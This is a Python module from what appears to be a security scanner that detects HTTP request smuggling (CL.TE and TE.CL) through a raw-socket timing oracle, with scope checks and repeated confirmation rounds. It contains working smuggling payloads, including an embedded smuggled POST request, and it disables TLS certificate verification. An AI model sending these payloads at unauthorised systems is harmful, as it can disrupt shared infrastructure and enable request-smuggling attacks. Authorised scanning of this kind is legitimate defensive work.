"""HTTP request smuggling probe (CL.TE / TE.CL).

Sends two payload shapes per target:
  * CL.TE — Content-Length is honored by the front-end, Transfer-Encoding by the back-end
  * TE.CL — front-end uses Transfer-Encoding, back-end uses Content-Length

Detection: a successful smuggle produces an unusually long response time
(>5s) for a request that should be cheap (front-end waits for more bytes
the back-end has already consumed). This is the canonical Burp-style
timing oracle.

This scanner uses raw sockets bypassing httpx — it has to, because we
need exact byte-level control over headers. It honors scope but not the
stealth rate limiter (one socket open at a time per host).

⚠ Only run against hosts where smuggling testing is explicitly in scope —
mis-targeted smuggling can DoS shared infrastructure.
"""
from __future__ import annotations

import asyncio
import ssl
import time
from typing import TYPE_CHECKING
from urllib.parse import urlparse

if TYPE_CHECKING:
    from core.orchestrator import Context


async def _raw_send(host: str, port: int, payload: bytes, use_tls: bool,
                    bucket=None, timeout: float = 10.0) -> tuple[float, bytes]:
    """Open a raw TCP/TLS connection, write the payload, read until close or timeout.

    *bucket* is the host's stealth token bucket — taken before egress so this
    raw-socket path doesn't bypass the rate limiter the rest of the tool honors."""
    if bucket is not None:
        await bucket.take()
    ctx_ssl = ssl.create_default_context() if use_tls else None
    if ctx_ssl:
        ctx_ssl.check_hostname = False
        ctx_ssl.verify_mode = ssl.CERT_NONE
    start = time.perf_counter()
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port, ssl=ctx_ssl, server_hostname=host if use_tls else None),
            timeout=5.0,
        )
        writer.write(payload)
        await writer.drain()
        try:
            data = await asyncio.wait_for(reader.read(8192), timeout=timeout)
        except asyncio.TimeoutError:
            data = b""
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
    except Exception as exc:
        return time.perf_counter() - start, b"ERR:" + str(exc).encode()
    return time.perf_counter() - start, data


def _payloads(host: str, path: str) -> dict[str, bytes]:
    """The two timing-oracle payload shapes, keyed by smuggle class."""
    # CL.TE: front-end honors Content-Length=4 (G\r\n\r\n), back-end honors Transfer-Encoding -> reads one chunk of size 0 then waits
    cl_te = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
        f"G"
    ).encode()

    # TE.CL: front-end honors Transfer-Encoding (terminates after 0\r\n\r\n), back-end Content-Length=33 (waits for SMUGGLED)
    te_cl_body = "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n"
    te_cl = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: {len(te_cl_body)}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"{te_cl_body}"
    ).encode()
    return {"CL.TE": cl_te, "TE.CL": te_cl}


async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET", form=None):
    findings: list[dict] = []
    parsed = urlparse(url)
    host = parsed.hostname or ""
    if not host:
        return findings
    if ctx.scope and not ctx.scope.allows(url)[0]:
        return findings
    use_tls = parsed.scheme == "https"
    port = parsed.port or (443 if use_tls else 80)
    path = parsed.path or "/"

    pl = _payloads(host, path)
    bucket = ctx.http.host_bucket(parsed.netloc)

    # Round 1: which shape (if any) hangs while its inverse stays prompt?
    elapsed_cl_te, _ = await _raw_send(host, port, pl["CL.TE"], use_tls, bucket=bucket)
    elapsed_te_cl, _ = await _raw_send(host, port, pl["TE.CL"], use_tls, bucket=bucket)
    if elapsed_cl_te > 5.0 and elapsed_te_cl < 5.0:
        kind, first = "CL.TE", elapsed_cl_te
    elif elapsed_te_cl > 5.0 and elapsed_cl_te < 5.0:
        kind, first = "TE.CL", elapsed_te_cl
    else:
        return findings  # no differential — not even a candidate

    # A single timing sample flaps (CDN jitter, cold connections). Require the
    # differential to reproduce on a confirmation round before reporting, and
    # ship the samples so the finding carries its own proof.
    inverse = "TE.CL" if kind == "CL.TE" else "CL.TE"
    t_slow2, _s = await _raw_send(host, port, pl[kind], use_tls, bucket=bucket)
    t_fast2, _f = await _raw_send(host, port, pl[inverse], use_tls, bucket=bucket)
    if not (t_slow2 > 5.0 and t_fast2 < 5.0):
        return findings  # did not reproduce — treat as jitter, not a finding

    samples = [{"flagged_shape_s": round(first, 2),
                "inverse_shape_s": round(elapsed_te_cl if kind == "CL.TE" else elapsed_cl_te, 2)},
               {"flagged_shape_s": round(t_slow2, 2), "inverse_shape_s": round(t_fast2, 2)}]
    findings.append(_finding(url, kind, t_slow2, samples=samples))
    return findings


async def reprobe(ctx: "Context", finding: dict):
    """Re-verify a CL.TE/TE.CL finding by re-measuring the timing differential.

    Returns ``(result, proof)`` where result is True (reproduced consistently),
    False (differential clearly gone — likely a fluke), or None (too noisy /
    not applicable). The proof dict captures the raw payload and every timing
    sample so the report can show the actual oracle, not a curl.
    """
    url = finding.get("url") or ""
    parsed = urlparse(url)
    host = parsed.hostname or ""
    if not host:
        return None, {}
    if ctx.scope and not ctx.scope.allows(url)[0]:
        return None, {}
    kind = (finding.get("metadata") or {}).get("kind")
    if kind not in ("CL.TE", "TE.CL"):
        return None, {}
    use_tls = parsed.scheme == "https"
    port = parsed.port or (443 if use_tls else 80)
    path = parsed.path or "/"
    bucket = ctx.http.host_bucket(parsed.netloc)
    pl = _payloads(host, path)
    inverse = "TE.CL" if kind == "CL.TE" else "CL.TE"

    samples = []
    for _ in range(2):
        t_slow, _d = await _raw_send(host, port, pl[kind], use_tls, bucket=bucket)
        t_fast, _d2 = await _raw_send(host, port, pl[inverse], use_tls, bucket=bucket)
        samples.append({"flagged_shape_s": round(t_slow, 2),
                        "inverse_shape_s": round(t_fast, 2)})

    confirmed = all(s["flagged_shape_s"] > 5.0 and s["inverse_shape_s"] < 5.0
                    for s in samples)
    clearly_fast = all(s["flagged_shape_s"] < 5.0 for s in samples)
    proof = {
        "verified": confirmed, "method": "RAW-SOCKET", "url": url,
        "request": f"{kind} timing-oracle payload (raw socket):\n"
                   + pl[kind].decode(errors="replace"),
        "samples": samples,
        "rationale": (
            f"The {kind} shape hung (>5s) while its inverse {inverse} returned "
            f"promptly across {len(samples)} repeats — a reproducible front/back-end "
            "header-parsing disagreement."
            if confirmed else
            "Timing differential did not reproduce consistently on re-test."),
    }
    if confirmed:
        return True, proof
    if clearly_fast:
        return False, proof
    return None, proof


def _finding(url: str, kind: str, elapsed: float, samples: list | None = None) -> dict:
    meta = {"kind": kind, "elapsed_s": elapsed}
    if samples:
        meta["samples"] = samples
    confirmed = " (confirmed across 2 rounds)" if samples else ""
    return {
        "category": "smuggling",
        "title": f"HTTP request smuggling ({kind}) — front/back-end disagree",
        "severity": "high", "cvss": 8.1,
        "url": url,
        "evidence": f"{kind} payload triggered a {elapsed:.2f}s hang while the inverse "
                    f"shape returned promptly{confirmed} — strong signal of header-parsing "
                    "disagreement.",
        "request": f"POST {url}\nTransfer-Encoding: chunked + Content-Length",
        "metadata": meta,
    }
